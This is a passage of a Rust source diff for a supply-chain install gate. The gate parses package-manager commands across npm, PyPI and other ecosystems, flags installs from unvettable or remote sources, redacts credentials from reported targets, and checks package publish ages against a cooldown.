+                | "--timeout"
+                | "--exists-action"
+                | "--trusted-host"
+                | "--cert"
+                | "--client-cert"
+                | "--cache-dir"
+                | "--use-feature"
+                | "--use-deprecated"
+                | "--index-url"
+                | "-i"
+                | "--extra-index-url"
+                | "--find-links"
+                | "-f"
+        ),
+        "uv" => matches!(
+            flag,
+            "--directory"
+                | "--project"
+                | "--config-file"
+                | "--cache-dir"
+                | "--python"
+                | "--color"
+                | "--index"
+                | "--default-index"
+                | "--index-url"
+                | "-i"
+                | "--extra-index-url"
+                | "--find-links"
+                | "-f"
+                | "--trusted-host"
+                | "--cert"
+                | "--client-cert"
+                | "--proxy"
+        ),
+        "poetry" => matches!(flag, "--directory" | "-C" | "--project" | "-P"),
+        "pipx" => matches!(flag, "--global" | "--pip-args" | "--python"),
+        "pdm" => matches!(flag, "--project" | "-p" | "--config"),
+        "pipenv" => matches!(flag, "--where" | "--venv" | "--py" | "--envs"),
+        "conda" | "mamba" => matches!(
+            flag,
+            "--name" | "-n" | "--prefix" | "-p" | "--channel" | "-c"
+        ),
+        "brew" => matches!(flag, "--repository"),
+        _ => false,
+    }
+}
+
+fn manager_option_is_boolean(manager: &str, flag: &str) -> bool {
+    if flag == "--" {
+        return true;
+    }
+    match manager {
+        "npm" => matches!(
+            flag,
+            "--global"
+                | "-g"
+                | "--force"
+                | "--silent"
+                | "--json"
+                | "--yes"
+                | "-y"
+                | "--save"
+                | "--save-dev"
+                | "-D"
+                | "--save-prod"
+                | "-P"
+                | "--save-optional"
+                | "-O"
+                | "--save-peer"
+                | "--no-save"
+                | "--production"
+                | "--ignore-scripts"
+                | "--no-audit"
+                | "--no-fund"
+        ),
+        "pnpm" => matches!(
+            flag,
+            "--global"
+                | "-g"
+                | "--workspace-root"
+                | "-w"
+                | "--silent"
+                | "--frozen-lockfile"
+                | "--lockfile-only"
+                | "--ignore-scripts"
+                | "--offline"
+                | "--prefer-offline"
+        ),
+        "yarn" => matches!(
+            flag,
+            "--silent"
+                | "--verbose"
+                | "--json"
+                | "--offline"
+                | "--frozen-lockfile"
+                | "--production"
+                | "--ignore-scripts"
+                | "--non-interactive"
+        ),
+        "bun" => matches!(
+            flag,
+            "--silent"
+                | "--verbose"
+                | "--no-save"
+                | "--frozen-lockfile"
+                | "--production"
+                | "--dry-run"
+        ),
+        "pip" => {
+            matches!(
+                flag,
+                "--isolated"
+                    | "--require-virtualenv"
+                    | "--no-input"
+                    | "--no-cache-dir"
+                    | "--disable-pip-version-check"
+                    | "--no-color"
+                    | "--no-python-version-warning"
+                    | "--user"
+                    | "-U"
+                    | "--upgrade"
+                    | "--pre"
+                    | "--no-deps"
+                    | "--no-index"
+                    | "--verbose"
+                    | "--quiet"
+            ) || is_repeated_short_flag(flag, 'v')
+                || is_repeated_short_flag(flag, 'q')
+        }
+        "uv" => {
+            matches!(
+                flag,
+                "--offline"
+                    | "--no-cache"
+                    | "--native-tls"
+                    | "--managed-python"
+                    | "--verbose"
+                    | "--quiet"
+                    | "-U"
+                    | "--upgrade"
+                    | "--pre"
+                    | "--no-deps"
+                    | "--no-index"
+            ) || is_repeated_short_flag(flag, 'v')
+                || is_repeated_short_flag(flag, 'q')
+        }
+        "poetry" => matches!(
+            flag,
+            "--no-cache" | "--no-plugins" | "--no-interaction" | "-n"
+        ),
+        "pipx" => matches!(flag, "--verbose" | "--quiet"),
+        "pdm" => matches!(flag, "--global" | "-g" | "--verbose" | "-v"),
+        "pipenv" => matches!(flag, "--bare" | "--quiet" | "--verbose"),
+        "conda" | "mamba" => matches!(flag, "--yes" | "-y" | "--quiet" | "-q" | "--json"),
+        "brew" => matches!(flag, "--debug" | "--quiet" | "--verbose"),
+        _ => false,
+    }
+}
+
+fn is_repeated_short_flag(flag: &str, expected: char) -> bool {
+    flag.strip_prefix('-').is_some_and(|suffix| {
+        !suffix.is_empty() && suffix.chars().all(|character| character == expected)
+    })
+}
+
+fn trim_shell_token(token: &str) -> &str {
+    token.trim().trim_matches(['\'', '"'])
+}
+
+fn is_default_registry(manager: &str, value: Option<&str>) -> bool {
+    let Some(value) = value.map(trim_shell_token) else {
+        return false;
+    };
+    let value = value.trim_end_matches('/');
+    match manager {
+        "npm" | "pnpm" | "yarn" | "bun" => value.eq_ignore_ascii_case("https://registry.npmjs.org"),
+        _ => false,
+    }
+}
+
+/// Return a credential-free explanation when a CLI option can change the
+/// source whose package is actually installed. Explicitly selecting the same
+/// npm registry queried by this gate is safe. PyPI transport/index overrides,
+/// config/directory switches, and alternate or additional sources are
+/// unvettable without evaluating external configuration and trust state.
+fn source_option_unvettable_detail(
+    manager: &str,
+    flag: &str,
+    value: Option<&str>,
+) -> Option<String> {
+    if manager == "pnpm" && flag == "--frozen-lockfile" {
+        return Some(PNPM_LOCKFILE_CAVEAT.to_string());
+    }
+    let registry_flag = matches!(manager, "npm" | "pnpm" | "yarn" | "bun") && flag == "--registry";
+    if registry_flag {
+        return (!is_default_registry(manager, value)).then(|| {
+            format!(
+                "{manager} {flag} selects a registry the gate does not query; refusing to vet against unrelated metadata"
+            )
+        });
+    }
+
+    let changes_source_or_config = match manager {
+        "npm" => matches!(flag, "--userconfig" | "--globalconfig" | "--prefix" | "-C"),
+        "pnpm" => matches!(flag, "--dir" | "-C" | "--config-dir" | "--workspace-dir"),
+        "yarn" => matches!(flag, "--cwd" | "--use-yarnrc"),
+        "bun" => matches!(flag, "--cwd" | "--config"),
+        "pip" => matches!(
+            flag,
+            "--trusted-host"
+                | "--cert"
+                | "--client-cert"
+                | "--proxy"
+                | "--index-url"
+                | "-i"
+                | "--extra-index-url"
+                | "--find-links"
+                | "-f"
+                | "--no-index"
+        ),
+        "uv" => matches!(
+            flag,
+            "--trusted-host"
+                | "--cert"
+                | "--client-cert"
+                | "--proxy"
+                | "--index"
+                | "--default-index"
+                | "--index-url"
+                | "-i"
+                | "--extra-index-url"
+                | "--find-links"
+                | "-f"
+                | "--no-index"
+                | "--config-file"
+                | "--directory"
+                | "--project"
+        ),
+        "poetry" => matches!(flag, "--directory" | "-C" | "--project" | "-P"),
+        _ => false,
+    };
+    changes_source_or_config.then(|| {
+        format!(
+            "{manager} {flag} can change source, transport trust, or config resolution; registry metadata cannot verify the selected artifact"
+        )
+    })
+}
+
+fn token_install_spec(
+    manager: &str,
+    tokens: &[(usize, String)],
+    idx: usize,
+    segment_end: usize,
+) -> Option<TokenInstallSpec> {
+    let word = tokens.get(idx)?.1.to_ascii_lowercase();
+    let spec = match (manager, word.as_str()) {
+        ("npx" | "pnpx", package) if !package.starts_with('-') => {
+            (Ecosystem::Npm, true, Some(PACKAGE_LAUNCHER_CAVEAT))
+        }
+        ("npm", "install" | "i" | "add") | ("pnpm", "install" | "i" | "add") => {
+            (Ecosystem::Npm, true, None)
+        }
+        ("npm", "ci") | ("pnpm", "ci") => (Ecosystem::Npm, false, None),
+        ("pnpm", "update") => (
+            Ecosystem::Npm,
+            true,
+            Some(
+                "pnpm update package intelligence requires local Mongo/local-model support; not vettable by this gate yet",
+            ),
+        ),
+        ("yarn", "add") => (Ecosystem::Npm, true, None),
+        ("yarn", "install") => (Ecosystem::Npm, false, None),
+        ("yarn", "dlx")
+            if tokens[idx + 1..segment_end]
+                .iter()
+                .any(|(_, token)| !token.starts_with('-')) =>
+        {
+            (Ecosystem::Npm, true, Some(PACKAGE_LAUNCHER_CAVEAT))
+        }
+        ("bun", "install" | "i" | "add") => (
+            Ecosystem::Npm,
+            true,
+            Some(
+                "bun install package intelligence requires local Mongo/local-model support; not vettable by this gate yet",
+            ),
+        ),
+        ("pip", "install") => (Ecosystem::Pypi, true, None),
+        ("uv", "install" | "add") => (Ecosystem::Pypi, true, None),
+        ("uv", "sync") => (Ecosystem::Pypi, false, None),
+        ("uv", "pip")
+            if idx + 1 < segment_end
+                && tokens[idx + 1].1.eq_ignore_ascii_case("install") =>
+        {
+            return Some(TokenInstallSpec {
+                verb_end_idx: idx + 1,
+                ecosystem: Ecosystem::Pypi,
+                accepts_packages: true,
+                local_only_caveat: None,
+            });
+        }
+        ("uv", "pip")
+            if idx + 1 < segment_end && tokens[idx + 1].1.eq_ignore_ascii_case("sync") =>
+        {
+            return Some(TokenInstallSpec {
+                verb_end_idx: idx + 1,
+                ecosystem: Ecosystem::Pypi,
+                accepts_packages: false,
+                local_only_caveat: None,
+            });
+        }
+        ("poetry", "add") => (Ecosystem::Pypi, true, None),
+        ("poetry", "install") => (Ecosystem::Pypi, false, None),
+        ("poetry", "update") => (
+            Ecosystem::Pypi,
+            true,
+            Some(
+                "poetry update package intelligence requires local Mongo/local-model support; not vettable by this gate yet",
+            ),
+        ),
+        ("pipx", "install") => (Ecosystem::Pypi, true, None),
+        ("pdm", "add") => (
+            Ecosystem::Pypi,
+            true,
+            Some(
+                "pdm package intelligence requires local Mongo/local-model support; not vettable by this gate yet",
+            ),
+        ),
+        ("pdm", "install" | "sync") => (Ecosystem::Pypi, false, None),
+        ("pipenv", "install") => (
+            Ecosystem::Pypi,
+            true,
+            Some(
+                "pipenv package intelligence requires local Mongo/local-model support; not vettable by this gate yet",
+            ),
+        ),
+        ("pipenv", "sync") => (Ecosystem::Pypi, false, None),
+        ("conda", "install" | "create") => (
+            Ecosystem::Pypi,
+            true,
+            Some("conda resolves from conda channels; not vettable against PyPI — review manually"),
+        ),
+        ("mamba", "install" | "create") => (
+            Ecosystem::Pypi,
+            true,
+            Some("mamba resolves from conda channels; not vettable against PyPI — review manually"),
+        ),
+        ("brew", "install") => (
+            Ecosystem::Unknown,
+            true,
+            Some(
+                "brew packages require Homebrew/local package intelligence; not vettable by this gate yet",
+            ),
+        ),
+        _ => return None,
+    };
+
+    Some(TokenInstallSpec {
+        verb_end_idx: idx,
+        ecosystem: spec.0,
+        accepts_packages: spec.1,
+        local_only_caveat: spec.2,
+    })
+}
+
+fn locate_token_install(
+    manager: &str,
+    tokens: &[(usize, String)],
+    head_idx: usize,
+    segment_end: usize,
+) -> Option<(TokenInstallSpec, bool, Option<String>)> {
+    let mut idx = head_idx + 1;
+    let mut ambiguous_option = false;
+    let mut source_option_detail = None;
+    while idx < segment_end {
+        if let Some(spec) = token_install_spec(manager, tokens, idx, segment_end) {
+            return Some((spec, ambiguous_option, source_option_detail));
+        }
+
+        let token = tokens[idx].1.as_str();
+        if !token.starts_with('-') {
+            if ambiguous_option {
+                for probe in idx + 1..segment_end {
+                    if let Some(spec) = token_install_spec(manager, tokens, probe, segment_end) {
+                        return Some((spec, true, source_option_detail));
+                    }
+                }
+            }
+            return None;
+        }
+
+        let (flag, attached_value) = token
+            .split_once('=')
+            .map_or((token, None), |(flag, value)| (flag, Some(value)));
+        let option_value = attached_value.or_else(|| {
+            tokens
+                .get(idx + 1)
+                .filter(|(_, value)| !value.starts_with('-'))
+                .map(|(_, value)| value.as_str())
+        });
+        if let Some(detail) = source_option_unvettable_detail(manager, flag, option_value) {
+            source_option_detail.get_or_insert(detail);
+        }
+        let attached = attached_value.is_some();
+        if attached || manager_option_is_boolean(manager, flag) {
+            idx += 1;
+        } else if manager_option_takes_value(manager, flag) {
+            idx = idx.saturating_add(2);
+        } else {
+            // Unknown option arity is ambiguous. Continue looking for a
+            // recognised install verb, but mark the result unvettable rather
+            // than guessing that this option cannot consume the next word.
+            ambiguous_option = true;
+            idx += 1;
+        }
+    }
+    None
+}
+
+/// Token-first fallback for installs raw regex cannot safely classify:
+/// concatenated quoted fragments and manager-wide options before the verb.
+fn detect_tokenised_installs(
+    cmd: &str,
+    claimed: &mut std::collections::BTreeMap<usize, usize>,
+    out: &mut Vec<ParsedInstall>,
+) {
+    let tokens = match shell_tokens(cmd) {
+        Ok(tokens) => tokens,
+        Err(error) => {
+            out.push(ParsedInstall {
+                ecosystem: Ecosystem::Unknown,
+                packages: Vec::new(),
+                has_editable: false,
+                unvettable: Some(format!(
+                    "shell tokenisation failed ({error}); refusing to treat an ambiguous command as safe"
+                )),
+            });
+            return;
+        }
+    };
+    let mut segment_start = 0;
+    while segment_start < tokens.len() {
+        while segment_start < tokens.len() && is_shell_operator(&tokens[segment_start].1) {
+            segment_start += 1;
+        }
+        if segment_start >= tokens.len() {
+            break;
+        }
+        let segment_end = (segment_start..tokens.len())
+            .find(|&idx| is_shell_operator(&tokens[idx].1))
+            .unwrap_or(tokens.len());
+
+        for head_idx in segment_start..segment_end {
+            let head_offset = tokens[head_idx].0;
+            if claimed
+                .range(..=head_offset)
+                .next_back()
+                .is_some_and(|(_, &end)| head_offset < end)
+            {
+                continue;
+            }
+            let Some(manager) = normalised_manager(&tokens[head_idx].1) else {
+                continue;
+            };
+            let Some((spec, ambiguous_option, source_option_detail)) =
+                locate_token_install(&manager, &tokens, head_idx, segment_end)
+            else {
+                continue;
+            };
+
+            let end_offset = tokens
+                .get(segment_end)
+                .map(|(offset, _)| *offset)
+                .unwrap_or(cmd.len());
+            claimed.insert(head_offset, end_offset.max(head_offset + 1));
+
+            if ambiguous_option {
+                out.push(ParsedInstall {
+                    ecosystem: spec.ecosystem,
+                    packages: Vec::new(),
+                    has_editable: false,
+                    unvettable: Some(format!(
+                        "{} options before the install verb have ambiguous arity; refusing to guess the package set",
+                        manager
+                    )),
+                });
+                continue;
+            }
+            if let Some(caveat) = spec.local_only_caveat {
+                out.push(ParsedInstall {
+                    ecosystem: spec.ecosystem,
+                    packages: Vec::new(),
+                    has_editable: false,
+                    unvettable: Some(caveat.to_string()),
+                });
+                continue;
+            }
+            if !spec.accepts_packages {
+                out.push(ParsedInstall {
+                    ecosystem: spec.ecosystem,
+                    packages: Vec::new(),
+                    has_editable: false,
+                    unvettable: Some(
+                        "bare lockfile install — package set is resolved from project metadata the gate cannot vet"
+                            .to_string(),
+                    ),
+                });
+                continue;
+            }
+
+            let arg_string = tokens[spec.verb_end_idx + 1..segment_end]
+                .iter()
+                .map(|(_, token)| token.as_str())
+                .collect::<Vec<_>>()
+                .join(" ");
+            let (mut packages, has_editable, source_detail) =
+                parse_package_args(&arg_string, &manager);
+            let has_unvettable_source = source_option_detail.is_some() || source_detail.is_some();
+            let parsed_detail = if packages.is_empty() && !has_editable {
+                Some(source_detail.unwrap_or_else(|| {
+                    if manager == "pnpm" {
+                        PNPM_LOCKFILE_CAVEAT.to_string()
+                    } else {
+                        "install resolves packages from a lockfile/requirements file the gate cannot vet"
+                            .to_string()
+                    }
+                }))
+            } else {
+                source_detail
+            };
+            if has_unvettable_source {
+                packages.clear();
+            }
+            out.push(ParsedInstall {
+                ecosystem: spec.ecosystem,
+                packages,
+                has_editable,
+                unvettable: source_option_detail.or(parsed_detail),
+            });
+        }
+
+        segment_start = segment_end.saturating_add(1);
+    }
 }
 
 /// Scan the shell token stream for package-manager install verbs that
@@ -1363,16 +2092,16 @@ fn detect_bare_lockfile_installs(
     claimed: &mut std::collections::BTreeMap<usize, usize>,
     out: &mut Vec<ParsedInstall>,
 ) {
-    let tokens = shell_tokens(cmd);
+    let Ok(tokens) = shell_tokens(cmd) else {
+        // `detect_tokenised_installs` runs immediately before this pass and
+        // owns the single fail-closed finding for the same error.
+        return;
+    };
     // Look-ahead helper that lowercases the Nth token relative to `idx` so
     // verb sub-commands like `INSTALL`, `Ci`, `Sync` classify the same as
     // their canonical lowercase form (Windows file-systems and shells are
     // case-preserving but case-insensitive on the head; the gate must agree).
-    let next_lower = |i: usize| {
-        tokens
-            .get(i)
-            .map(|(_, t)| t.to_ascii_lowercase())
-    };
+    let next_lower = |i: usize| tokens.get(i).map(|(_, t)| t.to_ascii_lowercase());
 
     let mut idx = 0;
     while idx < tokens.len() {
@@ -1549,26 +2278,28 @@ fn detect_bare_lockfile_installs(
                 // token), not just the head — the end is read by no later
                 // pass today, but a short span would silently break dedup
                 // if another detector is added after this one.
-                let verb_end = tokens[verb_span_end_idx].0
-                    + tokens[verb_span_end_idx].1.len();
+                let verb_end = tokens[verb_span_end_idx].0 + tokens[verb_span_end_idx].1.len();
                 claimed.insert(*start, verb_end);
+                let local_only_caveat = (tok_norm == "pnpm").then_some(PNPM_LOCKFILE_CAVEAT);
                 out.push(ParsedInstall {
                     ecosystem: eco,
                     packages: Vec::new(),
                     has_editable: false,
-                    unvettable: Some(match eco {
-                        Ecosystem::Npm => "bare lockfile install — pulls the dependency tree \
-                                           from package-lock.json/pnpm-lock.yaml/yarn.lock/bun.lockb \
-                                           the gate cannot vet"
-                            .to_string(),
-                        Ecosystem::Pypi => "bare lockfile install — pulls the dependency tree \
-                                            from poetry.lock/uv.lock/pdm.lock/Pipfile.lock/pyproject.toml \
-                                            the gate cannot vet"
-                            .to_string(),
-                        Ecosystem::Unknown => "bare lockfile install — ecosystem could not be \
-                                               resolved; the gate cannot vet"
-                            .to_string(),
-                    }),
+                    unvettable: Some(local_only_caveat.map(str::to_string).unwrap_or_else(
+                        || match eco {
+                            Ecosystem::Npm => "bare lockfile install — pulls the dependency tree \
+                                               from package-lock.json/pnpm-lock.yaml/yarn.lock/bun.lockb \
+                                               the gate cannot vet"
+                                .to_string(),
+                            Ecosystem::Pypi => "bare lockfile install — pulls the dependency tree \
+                                                from poetry.lock/uv.lock/pdm.lock/Pipfile.lock/pyproject.toml \
+                                                the gate cannot vet"
+                                .to_string(),
+                            Ecosystem::Unknown => "bare lockfile install — ecosystem could not be \
+                                                   resolved; the gate cannot vet"
+                                .to_string(),
+                        },
+                    )),
                 });
             }
         }
@@ -1603,26 +2334,43 @@ fn split_attached_flag(tok: &str) -> Option<(&str, Option<&str>)> {
 /// of scope (very rare to see value-consuming flags in npm installs).
 const PIP_VALUE_CONSUMING_FLAGS: &[&str] = &[
     // package destination
-    "-t", "--target", "--prefix", "--root",
+    "-t",
+    "--target",
+    "--prefix",
+    "--root",
     // index discovery
-    "--index-url", "-i", "--extra-index-url", "--find-links", "-f",
+    "--index-url",
+    "-i",
+    "--extra-index-url",
+    "--find-links",
+    "-f",
     // platform / interpreter targeting
-    "--platform", "--python-version", "--implementation", "--abi",
+    "--platform",
+    "--python-version",
+    "--implementation",
+    "--abi",
     // network / trust
-    "--trusted-host", "--proxy", "--cert", "--client-cert",
+    "--trusted-host",
+    "--proxy",
+    "--cert",
+    "--client-cert",
     // wheel / binary policy
-    "--no-binary", "--only-binary",
+    "--no-binary",
+    "--only-binary",
     // upgrade strategy
     "--upgrade-strategy",
     // build / cache directories
-    "--build", "--cache-dir", "--src", "--log",
+    "--build",
+    "--cache-dir",
+    "--src",
+    "--log",
 ];
 
 /// Returns (registry-package-names with optional pinned version,
 /// saw_editable_arg, lockfile_source). `lockfile_source` is `Some(detail)`
 /// when a `-r`/`--requirement`/`-c`/`--constraint` indirection flag was seen
 /// (in either the separate or attached `=` form).
-fn parse_package_args(s: &str) -> (Vec<(String, Option<String>)>, bool, Option<String>) {
+fn parse_package_args(s: &str, manager: &str) -> ParsedPackageArgs {
     let mut pkgs = Vec::new();
     let mut editable = false;
     let mut lockfile_source: Option<String> = None;
@@ -1636,11 +2384,6 @@ fn parse_package_args(s: &str) -> (Vec<(String, Option<String>)>, bool, Option<S
         if tok.starts_with('#') {
             break;
         }
-        if tok == "-e" || tok == "--editable" {
-            editable = true;
-            tokens.next();
-            continue;
-        }
         // Requirements / constraints indirection. Accept BOTH the separate
         // form (`-r req.txt`, `--requirement req.txt`) and the attached `=`
         // form (`--requirement=req.txt`, `-r=req.txt`). When the file is
@@ -1648,7 +2391,40 @@ fn parse_package_args(s: &str) -> (Vec<(String, Option<String>)>, bool, Option<S
         // recovers it. Either way, set `lockfile_source` so the install is
         // flagged unvettable (#111 G1 follow-up).
         if let Some((flag, attached)) = split_attached_flag(tok) {
-            if matches!(flag, "-r" | "--requirement" | "-c" | "--constraint") {
+            if matches!(flag, "-e" | "--editable") {
+                let target = match attached {
+                    Some(value) if !value.is_empty() => Some(value),
+                    Some(_) => None,
+                    None => tokens
+                        .peek()
+                        .copied()
+                        .filter(|value| !value.starts_with('-'))
+                        .and_then(|_| tokens.next()),
+                };
+                let Some(target) = target else {
+                    lockfile_source.get_or_insert_with(|| {
+                        format!(
+                            "{flag} is missing its editable target; the install command cannot be vetted"
+                        )
+                    });
+                    continue;
+                };
+                if is_remote_package_source(target) {
+                    lockfile_source.get_or_insert_with(|| {
+                        format!(
+                            "install uses remote source '{}' ({}) — the gate cannot verify its registry identity",
+                            sanitise_source_target(target),
+                            flag
+                        )
+                    });
+                } else {
+                    editable = true;
+                }
+                continue;
+            }
+            if matches!(manager, "pip" | "uv" | "pipx")
+                && matches!(flag, "-r" | "--requirement" | "-c" | "--constraint")
+            {
                 let target: String = match attached {
                     Some(v) => v.to_string(),
                     None => tokens.next().unwrap_or("(unspecified)").to_string(),
@@ -1657,12 +2433,19 @@ fn parse_package_args(s: &str) -> (Vec<(String, Option<String>)>, bool, Option<S
                     format!(
                         "install reads packages from '{}' ({}) — the gate cannot vet a \
                          requirements/constraints file",
-                        target, flag
+                        sanitise_source_target(&target),
+                        flag
                     )
                 });
                 continue;
             }
-            if PIP_VALUE_CONSUMING_FLAGS.contains(&flag) {
+            let value = attached.or_else(|| tokens.peek().copied());
+            if let Some(detail) = source_option_unvettable_detail(manager, flag, value) {
+                lockfile_source.get_or_insert(detail);
+            }
+            if PIP_VALUE_CONSUMING_FLAGS.contains(&flag)
+                || manager_option_takes_value(manager, flag)
+            {
                 // Value-bearing flag: consume the value token only when it
                 // was NOT attached with `=`. #145 case 3.
                 if attached.is_none() {
@@ -1674,27 +2457,126 @@ fn parse_package_args(s: &str) -> (Vec<(String, Option<String>)>, bool, Option<S
         if tok.starts_with('-') {
             continue;
         }
-        if tok == "."
-            || tok.starts_with(".[")
-            || tok.starts_with("./")
-            || tok.starts_with("../")
-            || tok.starts_with("/")
-            || tok.starts_with("file:")
-            || tok.starts_with("git+")
-            || tok.starts_with("http://")
-            || tok.starts_with("https://")
+        let token = trim_shell_token(tok);
+        if is_remote_package_source(token) {
+            lockfile_source.get_or_insert_with(|| {
+                format!(
+                    "install uses remote source '{}' — the gate cannot verify its registry identity",
+                    sanitise_source_target(token)
+                )
+            });
+            continue;
+        }
+        if token == "."
+            || token.starts_with(".[")
+            || token.starts_with("./")
+            || token.starts_with("../")
+            || token.starts_with('/')
+            || token.starts_with("file:")
         {
             editable = true;
             continue;
         }
 
-        let (name, version) = split_name_version(tok);
+        let (name, version) = split_name_version(token);
         if !name.is_empty() {
             pkgs.push((name, version));
         }
     }
 
     (pkgs, editable, lockfile_source)
+}
+
+fn is_remote_package_source(token: &str) -> bool {
+    let token = trim_shell_token(token);
+    if sanitise_scp_source(token).is_some() {
+        return true;
+    }
+    let lower = token.to_ascii_lowercase();
+    [
+        "http://",
+        "https://",
+        "git://",
+        "git+http://",
+        "git+https://",
+        "git+ssh://",
+        "git+",
+        "git@",
+        "ssh://",
+        "ftp://",
+        "hg+",
+        "svn+",
+        "bzr+",
+    ]
+    .iter()
+    .any(|prefix| lower.starts_with(prefix))
+}
+
+fn sanitise_scp_source(target: &str) -> Option<String> {
+    let (user, location) = target.split_once('@')?;
+    if user.is_empty()
+        || user.chars().any(|character| {
+            character.is_whitespace() || matches!(character, '/' | '\\' | ':' | '@')
+        })
+    {
+        return None;
+    }
+    let (host, path) = location.split_once(':')?;
+    if host.is_empty()
+        || host
+            .chars()
+            .any(|character| character.is_whitespace() || matches!(character, '/' | '\\' | '@'))
+    {
+        return None;
+    }
+    let path = path
+        .split(['?', '#'])
+        .next()
+        .filter(|path| !path.is_empty())?;
+    let basename = path.rsplit('/').find(|component| !component.is_empty())?;
+    Some(format!("{host}/{basename}"))
+}
+
+/// Reduce an untrusted source target to a credential-free host/basename (for
+/// remote URLs) or basename (for local files) before it enters a finding.
+fn sanitise_source_target(target: &str) -> String {
+    let trimmed = trim_shell_token(target);
+    let parse_target = trimmed
+        .strip_prefix("git+")
+        .or_else(|| trimmed.strip_prefix("hg+"))
+        .or_else(|| trimmed.strip_prefix("svn+"))
+        .or_else(|| trimmed.strip_prefix("bzr+"))
+        .unwrap_or(trimmed);
+
+    let label = sanitise_scp_source(trimmed)
+        .or_else(|| {
+            url::Url::parse(parse_target)
+                .ok()
+                .and_then(|url| {
+                    let host = url.host_str()?;
+                    let basename = url
+                        .path_segments()
+                        .and_then(|mut segments| segments.rfind(|part| !part.is_empty()))
+                        .unwrap_or("<remote>");
+                    Some(format!("{}/{}", host, basename))
+                })
+                .or_else(|| {
+                    if is_remote_package_source(trimmed) {
+                        // Never fall back to echoing a malformed remote target: URL
+                        // parsing may have failed precisely around user-info, and a
+                        // best-effort secret regex is not an authorization boundary.
+                        Some("<remote>".to_string())
+                    } else {
+                        std::path::Path::new(trimmed)
+                            .file_name()
+                            .and_then(|name| name.to_str())
+                            .map(str::to_string)
+                    }
+                })
+        })
+        .unwrap_or_else(|| "<unspecified>".to_string());
+
+    crate::core::secret_redact::redact(&label).into_owned()
 }
 
 /// Strip a PEP 508 extras suffix (`name[extra]`, `name[a,b,c]`) from a
@@ -1804,13 +2686,12 @@ enum HttpErrTag {
 }
 
 /// Should we retry after a failure of shape `tag`? Yes for transport-level
-/// failures (DNS hiccup, connection reset, read timeout) and 5xx responses
-/// (registry unhealthy, transient overload). No for 4xx — those signal a
-/// terminal problem with the request (package missing, auth, rate-limit)
-/// where an immediate retry just adds load and won't change the outcome.
+/// failures (DNS hiccup, connection reset, read timeout), rate limiting, and
+/// 5xx responses (registry unhealthy, transient overload). Other 4xx statuses
+/// are terminal request failures.
 fn is_retryable_http_err_tag(tag: HttpErrTag) -> bool {
     match tag {
-        HttpErrTag::Status(code) => (500..600).contains(&code),
+        HttpErrTag::Status(code) => code == 429 || (500..600).contains(&code),
         HttpErrTag::Transport => true,
     }
 }
@@ -1884,86 +2765,124 @@ fn http_post_json(url: &str, body: &Value) -> Result<Value, String> {
     Err(last_err.unwrap_or_else(|| format!("HTTP {}: no attempts", url)))
 }
 
+type PackageMetadata = (String, DateTime<Utc>);
+
+/// A fresh mutable cache entry may short-circuit the network only when its
+/// publish time necessarily triggers the configured cooldown. In that case it
+/// can only make the decision stricter (Block); metadata old enough to permit
+/// Allow is always revalidated against the authoritative registry. `cache_get`
+/// already discards entries outside the on-disk TTL, so `None` also covers a
+/// stale hint.
+fn revalidate_cached_metadata<F>(
+    cached_hint: Option<PackageMetadata>,
+    cooldown_days: u32,
+    fetch_authoritative: F,
+) -> Result<(PackageMetadata, bool), String>
+where
+    F: FnOnce() -> Result<PackageMetadata, String>,
+{
+    if let Some(cached) = cached_hint.as_ref() {
+        let age = (Utc::now() - cached.1).max(ChronoDuration::zero());
+        if age < ChronoDuration::days(i64::from(cooldown_days)) {
+            return Ok((cached.clone(), false));
+        }
+    }
+    let authoritative = fetch_authoritative()?;
+    let cache_needs_refresh = cached_hint.as_ref() != Some(&authoritative);
+    Ok((authoritative, cache_needs_refresh))
+}
+
 /// Resolve (version, publish_time) for the package. If `pinned` is Some, use
 /// that version; otherwise resolve and use the registry's `latest`.
 /// Cache keys include the version so pinned-and-unpinned don't collide.
-fn npm_metadata(pkg: &str, pinned: Option<&str>) -> Result<(String, DateTime<Utc>), String> {
+fn npm_metadata(
+    pkg: &str,
+    pinned: Option<&str>,
+    cooldown_days: u32,
+) -> Result<PackageMetadata, String> {
     let cache_key = format!("{}@{}", pkg, pinned.unwrap_or("__latest__"));
-    if let Some(cached) = cache_get(Ecosystem::Npm, &cache_key) {
-        return Ok(cached);
+    let cached_hint = cache_get(Ecosystem::Npm, &cache_key);
+    let ((resolved, publish), refresh_cache) =
+        revalidate_cached_metadata(cached_hint, cooldown_days, || {
+            // Always query the full /<pkg> doc since per-version endpoints
+            // don't expose publish times.
+            let url = format!("https://registry.npmjs.org/{}", urlencoding(pkg));
+            let v = http_get_json(&url)?;
+            let resolved = match pinned {
+                Some(ver) => ver.to_string(),
+                None => v
+                    .pointer("/dist-tags/latest")
+                    .and_then(|x| x.as_str())
+                    .ok_or_else(|| "no dist-tags/latest".to_string())?
+                    .to_string(),
+            };
+            let ts = v
+                .pointer(&format!("/time/{}", resolved))
+                .and_then(|x| x.as_str())
+                .ok_or_else(|| format!("no publish time for version {}", resolved))?;
+            let publish = parse_iso8601(ts)?;
+            Ok((resolved, publish))
+        })?;
+    if refresh_cache {
+        cache_put(Ecosystem::Npm, &cache_key, &resolved, &publish);
     }
-    // Always query the full /<pkg> doc since per-version endpoints don't
-    // expose publish times.
-    let url = format!("https://registry.npmjs.org/{}", urlencoding(pkg));
-    let v = http_get_json(&url)?;
-    let resolved = match pinned {
-        Some(ver) => ver.to_string(),
-        None => v
-            .pointer("/dist-tags/latest")
-            .and_then(|x| x.as_str())
-            .ok_or_else(|| "no dist-tags/latest".to_string())?
-            .to_string(),
-    };
-    let ts = v
-        .pointer(&format!("/time/{}", resolved))
-        .and_then(|x| x.as_str())
-        .ok_or_else(|| format!("no publish time for version {}", resolved))?;
-    let publish = parse_iso8601(ts)?;
-    cache_put(Ecosystem::Npm, &cache_key, &resolved, &publish);
     Ok((resolved, publish))
 }
 
-fn pypi_metadata(pkg: &str, pinned: Option<&str>) -> Result<(String, DateTime<Utc>), String> {
+fn pypi_metadata(
+    pkg: &str,
+    pinned: Option<&str>,
+    cooldown_days: u32,
+) -> Result<PackageMetadata, String> {
     let cache_key = format!("{}@{}", pkg, pinned.unwrap_or("__latest__"));
-    if let Some(cached) = cache_get(Ecosystem::Pypi, &cache_key) {
-        return Ok(cached);
+    let cached_hint = cache_get(Ecosystem::Pypi, &cache_key);
+    let ((resolved, publish), refresh_cache) =
+        revalidate_cached_metadata(cached_hint, cooldown_days, || {
+            // When pinned, use the version-specific endpoint (smaller
+            // response). Otherwise discover info.version first.
+            if let Some(ver) = pinned {
+                let url = format!(
+                    "https://pypi.org/pypi/{}/{}/json",
+                    urlencoding(pkg),
